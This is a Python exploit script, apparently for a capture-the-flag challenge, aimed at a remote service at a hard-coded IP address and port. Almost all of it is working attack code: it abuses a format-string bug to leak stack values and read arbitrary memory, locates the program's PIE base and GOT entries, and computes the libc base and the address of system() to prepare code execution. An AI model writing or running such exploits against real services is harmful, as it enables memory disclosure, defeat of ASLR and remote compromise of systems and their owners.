#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    a15=leak_lld(s,15); start=a15&~0xfff
    for d in range(0,0x20000,0x1000):
        X=start-d; r=readmem(s,X)
        if r.startswith(b'\x7fELF'): return X
    return None

def robust_leak(s,n):
    for _ in range(5):
        v=leak_lld(s,n)
        if v is not None: return v
        time.sleep(0.2)
    return None

def robust_get_pie(s):
    for _ in range(5):
        a15=robust_leak(s,15)
        if a15:
            try:
                return get_pie(s)
            except Exception: pass
        time.sleep(0.2)
    return None

s=newconn(); pie=robust_get_pie(s)
print("pie=",hex(pie))
got={}
for off in range(0x3f00, 0x4060, 8):
    r=readmem(s, pie+off)
    strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
    got[off]=strb
# identify libc entries (high byte 0x7f or 0x7b)
libc=[]
for off,strb in got.items():
    if len(strb)>=5 and strb[-1] in (0x7f,0x7b):
        val=int.from_bytes(strb+b'\x00\x00','little')
        libc.append((off,val))
print("libc got entries:")
for off,val in sorted(libc, key=lambda x:x[1]):
    print(f"  got+{off:#x} = {hex(val)}")
if libc:
    lowest=min(v for _,v in libc)
    start=lowest & ~0xfff
    libc_base=None
    for d in range(0,0x300000,0x1000):
        X=start-d
        r=readmem(s,X)
        if r.startswith(b'\x7fELF'):
            libc_base=X; break
    print("libc_base=",hex(libc_base))
    if libc_base:
        print("system=",hex(libc_base+0x50d70))
        # offsets of each got entry
        for off,val in sorted(libc,key=lambda x:x[1]):
            print(f"  got+{off:#x} offset 0x{val-libc_base:x}")
s.close()
